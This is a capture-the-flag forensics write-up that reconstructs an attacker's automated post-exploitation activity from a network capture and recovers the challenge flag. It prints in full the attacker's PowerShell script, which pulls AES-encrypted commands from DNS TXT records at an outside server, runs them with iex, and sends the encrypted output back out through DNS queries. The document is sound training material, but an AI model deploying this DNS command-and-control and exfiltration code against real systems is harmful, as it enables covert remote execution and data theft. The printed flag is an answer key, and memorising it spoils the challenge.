# Automation
> Write-up author: jon-brandy
## DESCRIPTION:
Vinyr's threat intelligence is monitoring closely all APT groups from every possible galaxy, especially the most dangerous one, longhir. 
As stated by an anonymous threat intelligence officer, the malicious actors tend to automate their initial post-exploitation enumeration so they can have less on-keyboard time. 
You can find such an example in the provided network capture generated by a recent incident. Analyse it and find out what they are up to.
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

![image](https://user-images.githubusercontent.com/70703371/212104427-d1ae4793-d869-4710-b6a5-af4cbe472660.png)


![image](https://user-images.githubusercontent.com/70703371/212104385-f7725ea9-1a52-4212-bb3b-2b533353534f.png)


![image](https://user-images.githubusercontent.com/70703371/212104516-32695053-7d9e-45bd-9a03-30faa31e2150.png)


2. When i traversing through the TCP stream, i found this long base64 strings.

![image](https://user-images.githubusercontent.com/70703371/212208236-ae1fe04b-3351-4eca-b4f0-d6d2959dc57d.png)


3. Let's decode it with cyberchef.

> RESULT

```ps1
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

4. Got a powershell script.
5. Seems like the script is doing encryption and decryption using a specified key.
6. Based on the script, we could find the encrypted strings in the DNS packets with ip `147.182.172.189`. Let's filter the packets then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212211666-e37a95bd-6a68-4802-acfa-fea724c7527d.png)


7. Got several base64 strings.

![image](https://user-images.githubusercontent.com/70703371/212211806-a1940476-5383-45a9-8127-3924a100f22c.png)


8. Let's modify the script by adding a loop to decrypt every base64 strings with the specified key.

> THE MODIFIED SCRIPT

```ps1
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

$key = "a1E4MUtycWswTmtrMHdqdg=="

$encryptedString = ("Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=","hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=","58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=","eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru","BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=","vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=","M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh")

foreach ($i in $encryptedString) {
        $result = Decrypt-String $key $i
        echo $result
}

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/212212644-a16e7abf-18b0-46c2-83b3-f1e51bfa1c59.png)


9. Let's decode the base64 strings.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212212884-1095f5ad-1591-4204-b679-47466f024202.png)


10. We got half of the flag!
11. I stucked for a while here looking for the next part of the flag, then i found hex values appended to the domain name when checking the DNS packets.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212213223-5cd98804-973b-4519-b5c6-5e1e967e3cdf.png)


![image](https://user-images.githubusercontent.com/70703371/212213255-f2b8b034-c8e3-48d4-b5a9-5967880a01d9.png)


![image](https://user-images.githubusercontent.com/70703371/212213287-8b98a5c5-a155-496e-b485-cb7c86343c4a.png)


![image](https://user-images.githubusercontent.com/70703371/212213316-654d4578-cf7e-4e6a-8efb-51adba99a711.png)


12. And so on..
13. I concate every one of them:

```
CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A309E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833
```

14. Based from the script, we can decrypt this using AES decryption, let's use cyberchef.

![image](https://user-images.githubusercontent.com/70703371/212214214-292e8ef2-36c0-45de-80e4-a8ab3b594ddd.png)


> The IV value is the first 16 bytes (hex) we found. (Based from the script)

![image](https://user-images.githubusercontent.com/70703371/212214443-aa7eef9f-9330-4b28-b3cb-94ab3f8edbe5.png)


> RESULT

![image](https://user-images.githubusercontent.com/70703371/212214653-b3e7e7b6-b188-40e4-ad70-a1f1ad1f860c.png)


15. Got the final flag's partition!

## FLAG

```
HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```
